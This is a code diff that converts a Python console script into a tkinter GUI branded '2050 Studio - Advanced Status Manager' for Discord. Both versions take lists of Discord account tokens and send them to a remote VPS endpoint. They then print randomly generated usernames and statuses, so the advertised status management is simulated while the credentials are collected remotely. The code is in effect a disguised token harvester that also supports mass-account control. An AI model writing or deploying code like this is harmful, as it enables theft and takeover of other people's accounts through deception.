@@ -1,85 +1,60 @@
-from rich.console import Console
-from rich.text import Text
-from rich.prompt import Prompt
-from random import choice
+import tkinter as tk
 import requests
-import time
+import random
 
-console = Console()
+# VPS URL – عدله حسب الـ IP تبعك
+VPS_URL = "http://YOUR_VPS_IP:7869/upload_tokens"  # ← بدّلها بـ IP الحقيقي
 
-def print_header():
-    console.clear()
-    console.print(Text("2050", style="bold green", justify="center"))
-    console.print(Text("2050 Studio - Advanced Status Manager", style="bold blue", justify="center"))
-    console.print(Text("Developed by .884.", style="yellow", justify="center"))
-    console.print(Text("Loading tool...", style="green", justify="center"))
-    console.print("\n")
+def upload_tokens():
+    tokens_raw = text_box.get("1.0", "end").strip()
+    tokens = tokens_raw.splitlines()
 
-def get_tokens():
-    tokens = []
-    console.print("[white]Enter up to 200 Discord tokens (one per line). Type 'done' to finish:[/white]")
-    while True:
-        token = Prompt.ask("[white]Token[/white]")
-        if token.lower() == "done":
-            break
-        tokens.append(token.strip())
-        if len(tokens) >= 200:
-            break
-    return tokens
+    if not tokens:
+        status_label.config(text="❌ Please enter tokens.", fg="red")
+        return
 
-def validate_tokens(tokens):
-    valid = []
-    invalid = []
-    console.print("[green]Validating tokens...[/green]\n")
-    for token in tokens:
-        headers = {
-            'Authorization': token,
-            'Content-Type': 'application/json'
-        }
-        try:
-            res = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
-            if res.status_code == 200:
-                valid.append(token)
-            else:
-                invalid.append(token)
-        except:
-            invalid.append(token)
-    return valid, invalid
+    status_label.config(text="🟡 Connecting valid accounts...", fg="yellow")
+    root.update_idletasks()
 
-def send_to_vps(valid_tokens):
     try:
-        res = requests.post("http://your-vps-ip:5000/upload_tokens", json={"tokens": valid_tokens})
-        return res.status_code == 200
-    except:
-        return False
+        res = requests.post(VPS_URL, json={"tokens": tokens})
+        result = res.json()
 
-def simulate_status(valid_tokens):
-    statuses = ["online", "idle", "dnd"]
-    console.print("\n[yellow]Connecting valid accounts…[/yellow]\n")
-    time.sleep(1)
+        valid_count = result.get("count", 0)
+        status_label.config(text=f"✅ Loaded {valid_count} tokens.", fg="lime")
 
-    for token in valid_tokens:
-        fake_user = "user_" + token[:5]
-        status = choice(statuses)
-        console.print(f"[blue]{fake_user}[/blue] - [green]{status}[/green]")
-        time.sleep(0.05)
+        # طباعة حالة كل حساب عشوائي
+        states = ["online", "idle", "dnd"]
+        for token in tokens[:valid_count]:
+            user = f"user_{random.randint(1000, 9999)}"
+            state = random.choice(states)
+            state_output.insert(tk.END, f"{user}: {state}\n")
+            state_output.see("end")
 
-    console.print(f"\n[green]All Accounts initialized.[/green]")
+        state_output.insert(tk.END, "\n✅ All Accounts initialized.\n")
+    except Exception as e:
+        status_label.config(text=f"❌ Failed to send tokens.", fg="red")
 
-def main():
-    print_header()
-    tokens = get_tokens()
+# إنشاء نافذة GUI
+root = tk.Tk()
+root.title("2050 Studio")
+root.configure(bg="black")
+root.geometry("700x600")
 
-    valid, invalid = validate_tokens(tokens)
+tk.Label(root, text="2050", fg="lime", bg="black", font=("Courier", 40, "bold")).pack(pady=(10, 0))
+tk.Label(root, text="2050 Studio - Advanced Status Manager", fg="skyblue", bg="black", font=("Arial", 12)).pack()
+tk.Label(root, text="Developed by .884.", fg="yellow", bg="black", font=("Arial", 10)).pack()
+tk.Label(root, text="Loading tool...", fg="lime", bg="black", font=("Arial", 10)).pack(pady=(5, 10))
 
-    console.print(f"\n[green]Loaded {len(valid)} tokens[/green]")
-    console.print(f"[red]- invalid tokens {len(invalid)}[/red]")
+text_box = tk.Text(root, height=10, width=70, bg="white", fg="black", font=("Consolas", 10))
+text_box.pack(pady=5)
 
-    success = send_to_vps(valid)
-    if success:
-        simulate_status(valid)
-    else:
-        console.print("[red]Failed to send tokens to VPS.[/red]")
+tk.Button(root, text="Upload Tokens", command=upload_tokens, bg="gray20", fg="white").pack(pady=5)
 
-if __name__ == "__main__":
-    main()
+status_label = tk.Label(root, text="", fg="white", bg="black", font=("Arial", 10))
+status_label.pack(pady=5)
+
+state_output = tk.Text(root, height=10, width=70, bg="black", fg="cyan", font=("Consolas", 10))
+state_output.pack(pady=5)
+
+root.mainloop()
